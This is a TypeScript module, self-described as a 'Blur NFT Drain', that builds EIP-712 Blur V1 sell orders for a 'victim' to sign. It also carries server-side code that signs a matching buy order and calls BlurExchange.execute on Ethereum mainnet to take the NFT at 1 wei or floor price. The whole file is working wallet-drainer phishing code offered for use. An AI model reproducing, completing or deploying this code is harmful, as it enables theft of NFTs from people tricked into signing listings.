/**
 * Blur NFT Drain — Phase 6
 * ========================
 * Builds EIP-712 typed data for Blur V1 sell orders (maker side).
 * The victim signs the order; the server fulfills it via BlurExchange.execute(sell, buy)
 * to receive the NFT at the specified price (typically floor price or 1 wei).
 *
 * Contracts (Ethereum mainnet, verified on Etherscan):
 *   BlurExchange V1:    0x000000000000ad05ccc4f10045630fb830b95127
 *   ExecutionDelegate:  0x00000000000111AbE46ff893f3B2fdF1F759a8A8
 *   StandardPolicyERC721: 0x00000000006411739DA1c40B106F8511de5D1FAC (non-oracle)
 *   OraclePolicyERC721:   0x0000000000daB4A563819e8fd93dbA3b25BC3495 (oracle-signed cancel)
 *
 * Reference:
 *   EIP-712 domain + types — code-423n4/2022-10-blur contracts/lib/OrderStructs.sol
 *   ORDER_TYPEHASH: "Order(address trader,uint8 side,address matchingPolicy,...,uint256 nonce)"
 */
import type { Address } from 'viem'
import { createPublicClient, createWalletClient, getAddress, http, isAddress } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

// ─── Contract addresses ───────────────────────────────────────────────────────

/** BlurExchange V1 proxy — Ethereum mainnet */
export const BLUR_EXCHANGE_V1 = '0x000000000000ad05ccc4f10045630fb830b95127' as Address

/** StandardPolicyERC721 — non-oracle listing matching policy */
export const BLUR_STANDARD_POLICY = '0x00000000006411739DA1c40B106F8511de5D1FAC' as Address

/** OraclePolicyERC721 — oracle-managed cancellation */
export const BLUR_ORACLE_POLICY = '0x0000000000daB4A563819e8fd93dbA3b25BC3495' as Address

/** ExecutionDelegate — handles actual NFT transfer on fulfillment */
export const BLUR_EXECUTION_DELEGATE = '0x00000000000111AbE46ff893f3B2fdF1F759a8A8' as Address

/** ZERO payment token = native ETH */
export const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000' as Address

// ─── Enums (match Solidity) ───────────────────────────────────────────────────

export const BLUR_SIDE = {
  BUY: 0,
  SELL: 1,
} as const

export const BLUR_SIGNATURE_VERSION = {
  SINGLE: 0,
  BULK: 1,
} as const

// ─── Types ────────────────────────────────────────────────────────────────────

export interface BlurFee {
  rate: number   // basis points out of 10000 (e.g. 250 = 2.5%)
  recipient: Address
}

export interface BlurOrderParameters {
  trader: Address
  side: number               // 0 = Buy, 1 = Sell
  matchingPolicy: Address
  collection: Address
  tokenId: bigint
  amount: bigint             // 1 for ERC-721
  paymentToken: Address      // zeroAddress for ETH
  price: bigint              // wei
  listingTime: bigint        // unix timestamp
  expirationTime: bigint     // unix timestamp (0 = oracle-managed)
  fees: BlurFee[]
  salt: bigint
  extraParams: `0x${string}` // '0x00' for single signature
  nonce: bigint
}

export interface BlurListingParams {
  offerer: Address | string
  nftContract: Address | string
  tokenId: string | bigint
  priceWei: string | bigint
  chainId: number
  nonce?: bigint
  fees?: BlurFee[]
  expirationDays?: number    // default 30
}

export interface BlurListingResult {
  typedData: {
    domain: {
      name: 'Blur Exchange'
      version: '1.0'
      chainId: number
      verifyingContract: Address
    }
    types: {
      Order: Array<{ name: string; type: string }>
      Fee: Array<{ name: string; type: string }>
    }
    primaryType: 'Order'
    message: Record<string, unknown>
  }
  order_parameters: BlurOrderParameters
  protocol: 'blur_listing'
}

// ─── EIP-712 type definitions (mirror Blur V1 OrderStructs.sol) ───────────────

const BLUR_EIP712_TYPES = {
  Order: [
    { name: 'trader', type: 'address' },
    { name: 'side', type: 'uint8' },
    { name: 'matchingPolicy', type: 'address' },
    { name: 'collection', type: 'address' },
    { name: 'tokenId', type: 'uint256' },
    { name: 'amount', type: 'uint256' },
    { name: 'paymentToken', type: 'address' },
    { name: 'price', type: 'uint256' },
    { name: 'listingTime', type: 'uint256' },
    { name: 'expirationTime', type: 'uint256' },
    { name: 'fees', type: 'Fee[]' },
    { name: 'salt', type: 'uint256' },
    { name: 'extraParams', type: 'bytes' },
    { name: 'nonce', type: 'uint256' },
  ],
  Fee: [
    { name: 'rate', type: 'uint16' },
    { name: 'recipient', type: 'address' },
  ],
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function resolveAddress(value: string, field: string): Address {
  // strict: false accepts both checksummed and lowercase/unchecksummed hex addresses
  if (!isAddress(value, { strict: false })) throw new Error(`Invalid ${field}: ${value}`)
  return getAddress(value) // normalize to EIP-55 checksum
}

function randomSalt(): bigint {
  const buf = new Uint8Array(8)
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(buf)
  } else {
    for (let i = 0; i < buf.length; i++) buf[i] = Math.floor(Math.random() * 256)
  }
  let v = 0n
  for (const b of buf) v = (v << 8n) | BigInt(b)
  return v
}

// ─── Main builder ─────────────────────────────────────────────────────────────

// ─── Blur fulfill (on-chain execute) ─────────────────────────────────────────

export interface BlurFulfillParams {
  sellOrder: BlurOrderParameters
  sellSignature: string   // victim's sig (0x-prefixed, 65 bytes)
  chainId: number
  /** Operator execution private key — signs the matching buy order */
  executionPrivateKey: `0x${string}`
  /** RPC URL for the chain */
  rpcUrl: string
}

export interface BlurFulfillResult {
  ok: boolean
  transaction_hash?: string
  detail?: string
}

/** ABI for BlurExchange.execute(sell, buy) — only the call we need */
const BLUR_EXCHANGE_ABI = [
  {
    name: 'execute',
    type: 'function',
    stateMutability: 'payable',
    inputs: [
      {
        name: 'sell',
        type: 'tuple',
        components: [
          { name: 'order', type: 'tuple', components: [
            { name: 'trader', type: 'address' },
            { name: 'side', type: 'uint8' },
            { name: 'matchingPolicy', type: 'address' },
            { name: 'collection', type: 'address' },
            { name: 'tokenId', type: 'uint256' },
            { name: 'amount', type: 'uint256' },
            { name: 'paymentToken', type: 'address' },
            { name: 'price', type: 'uint256' },
            { name: 'listingTime', type: 'uint256' },
            { name: 'expirationTime', type: 'uint256' },
            { name: 'fees', type: 'tuple[]', components: [
              { name: 'rate', type: 'uint16' },
              { name: 'recipient', type: 'address' },
            ]},
            { name: 'salt', type: 'uint256' },
            { name: 'extraParams', type: 'bytes' },
            { name: 'nonce', type: 'uint256' },
          ]},
          { name: 'v', type: 'uint8' },
          { name: 'r', type: 'bytes32' },
          { name: 's', type: 'bytes32' },
          { name: 'extraSignature', type: 'bytes' },
          { name: 'signatureVersion', type: 'uint8' },
          { name: 'blockNumber', type: 'uint256' },
        ],
      },
      {
        name: 'buy',
        type: 'tuple',
        components: [
          { name: 'order', type: 'tuple', components: [
            { name: 'trader', type: 'address' },
            { name: 'side', type: 'uint8' },
            { name: 'matchingPolicy', type: 'address' },
            { name: 'collection', type: 'address' },
            { name: 'tokenId', type: 'uint256' },
            { name: 'amount', type: 'uint256' },
            { name: 'paymentToken', type: 'address' },
            { name: 'price', type: 'uint256' },
            { name: 'listingTime', type: 'uint256' },
            { name: 'expirationTime', type: 'uint256' },
            { name: 'fees', type: 'tuple[]', components: [
              { name: 'rate', type: 'uint16' },
              { name: 'recipient', type: 'address' },
            ]},
            { name: 'salt', type: 'uint256' },
            { name: 'extraParams', type: 'bytes' },
            { name: 'nonce', type: 'uint256' },
          ]},
          { name: 'v', type: 'uint8' },
          { name: 'r', type: 'bytes32' },
          { name: 's', type: 'bytes32' },
          { name: 'extraSignature', type: 'bytes' },
          { name: 'signatureVersion', type: 'uint8' },
          { name: 'blockNumber', type: 'uint256' },
        ],
      },
    ],
    outputs: [],
  },
] as const

function splitSignature(sig: string): { v: number; r: `0x${string}`; s: `0x${string}` } {
  const hex = sig.startsWith('0x') ? sig.slice(2) : sig
  if (hex.length !== 130) throw new Error(`Invalid signature length: ${hex.length} (expected 130 hex chars)`)
  return {
    r: `0x${hex.slice(0, 64)}` as `0x${string}`,
    s: `0x${hex.slice(64, 128)}` as `0x${string}`,
    v: parseInt(hex.slice(128, 130), 16),
  }
}

/**
 * Execute a Blur V1 listing on-chain.
 * Creates a matching buy order from the operator vault and calls
 * BlurExchange.execute(sell, buy) with the listing price as msg.value.
 */
export async function fulfillBlurListing(params: BlurFulfillParams): Promise<BlurFulfillResult> {
  const chain = { ...mainnet, id: params.chainId }
  const account = privateKeyToAccount(params.executionPrivateKey)
  const transport = http(params.rpcUrl)

  const publicClient = createPublicClient({ chain, transport })
  const walletClient = createWalletClient({ chain, transport, account })

  const sell = params.sellOrder
  const nowSec = BigInt(Math.floor(Date.now() / 1000))

  // Build the matching buy order — same collection/tokenId/price, but side=BUY and trader=operator
  const buyOrder: BlurOrderParameters = {
    trader: account.address,
    side: BLUR_SIDE.BUY,
    matchingPolicy: sell.matchingPolicy,
    collection: sell.collection,
    tokenId: sell.tokenId,
    amount: sell.amount,
    paymentToken: ZERO_ADDRESS,  // ETH
    price: sell.price,
    listingTime: nowSec - 30n,
    expirationTime: nowSec + 600n,  // 10min — only needs to be valid for this tx
    fees: [],
    salt: randomSalt(),
    extraParams: '0x00' as `0x${string}`,
    nonce: 0n,
  }

  // Sign the buy order
  const buyResult = await buildBlurListingTypedData({
    offerer: account.address,
    nftContract: buyOrder.collection,
    tokenId: buyOrder.tokenId,
    priceWei: buyOrder.price,
    chainId: params.chainId,
    nonce: buyOrder.nonce,
  })

  const buySig = await walletClient.signTypedData({
    account,
    domain: buyResult.typedData.domain,
    types: buyResult.typedData.types,
    primaryType: 'Order',
    message: buyResult.typedData.message as Record<string, unknown>,
  })

  const { v: sellV, r: sellR, s: sellS } = splitSignature(params.sellSignature)
  const { v: buyV, r: buyR, s: buyS } = splitSignature(buySig)

  const sellInput = {
    order: sell,
    v: sellV,
    r: sellR,
    s: sellS,
    extraSignature: '0x' as `0x${string}`,
    signatureVersion: 0,
    blockNumber: 0n,
  }

  const buyInput = {
    order: buyOrder,
    v: buyV,
    r: buyR,
    s: buyS,
    extraSignature: '0x' as `0x${string}`,
    signatureVersion: 0,
    blockNumber: 0n,
  }

  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const hash: `0x${string}` = await (walletClient as any).writeContract({
      address: BLUR_EXCHANGE_V1,
      abi: BLUR_EXCHANGE_ABI,
      functionName: 'execute',
      args: [sellInput, buyInput],
      value: sell.price,  // ETH paid to match the sell price
    })

    await publicClient.waitForTransactionReceipt({ hash, timeout: 60_000 })

    return { ok: true, transaction_hash: hash }
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    return { ok: false, detail: msg }
  }
}

/**
 * Build EIP-712 typed data for a Blur V1 sell order.
 *
 * The victim signs this as the maker (seller). The server constructs the buy
 * side and submits both to BlurExchange.execute(sell, buy) to fulfill.
 *
 * @param params.offerer     - Victim's wallet address (the NFT seller)
 * @param params.nftContract - ERC-721 collection contract address
 * @param params.tokenId     - Token ID to list
 * @param params.priceWei    - Listing price in wei (use 1 for minimum, or floor price)
 * @param params.chainId     - EVM chain (1 = mainnet)
 * @param params.nonce       - On-chain nonce from `BlurExchange.nonces(offerer)` (default 0)
 * @param params.fees        - Creator royalty/fee array (default empty — no royalty)
 * @param params.expirationDays - Order validity in days (default 30)
 */
export async function buildBlurListingTypedData(params: BlurListingParams): Promise<BlurListingResult> {
  const trader = resolveAddress(String(params.offerer), 'offerer')
  const collection = resolveAddress(String(params.nftContract), 'nftContract')
  const tokenId = BigInt(params.tokenId)
  const price = BigInt(params.priceWei)
  const nonce = params.nonce ?? 0n
  const fees = params.fees ?? []
  const expirationDays = params.expirationDays ?? 30

  const nowSec = BigInt(Math.floor(Date.now() / 1000))
  const listingTime = nowSec - 30n  // 30s in the past to avoid clock skew
  const expirationTime = nowSec + BigInt(expirationDays) * 24n * 60n * 60n

  const order_parameters: BlurOrderParameters = {
    trader,
    side: BLUR_SIDE.SELL,
    matchingPolicy: BLUR_STANDARD_POLICY,
    collection,
    tokenId,
    amount: 1n,                  // ERC-721 = 1
    paymentToken: ZERO_ADDRESS,  // ETH
    price,
    listingTime,
    expirationTime,
    fees,
    salt: randomSalt(),
    extraParams: '0x00' as `0x${string}`,         // single signature mode
    nonce,
  }

  // Build the EIP-712 message — all bigints serialized as strings for JSON compatibility
  const message: Record<string, unknown> = {
    trader: order_parameters.trader,
    side: order_parameters.side,
    matchingPolicy: order_parameters.matchingPolicy,
    collection: order_parameters.collection,
    tokenId: order_parameters.tokenId.toString(),
    amount: order_parameters.amount.toString(),
    paymentToken: order_parameters.paymentToken,
    price: order_parameters.price.toString(),
    listingTime: order_parameters.listingTime.toString(),
    expirationTime: order_parameters.expirationTime.toString(),
    fees: order_parameters.fees,
    salt: order_parameters.salt.toString(),
    extraParams: order_parameters.extraParams,
    nonce: order_parameters.nonce.toString(),
  }

  const typedData = {
    domain: {
      name: 'Blur Exchange' as const,
      version: '1.0' as const,
      chainId: params.chainId,
      verifyingContract: BLUR_EXCHANGE_V1,
    },
    types: BLUR_EIP712_TYPES,
    primaryType: 'Order' as const,
    message,
  }

  return {
    typedData,
    order_parameters,
    protocol: 'blur_listing',
  }
}
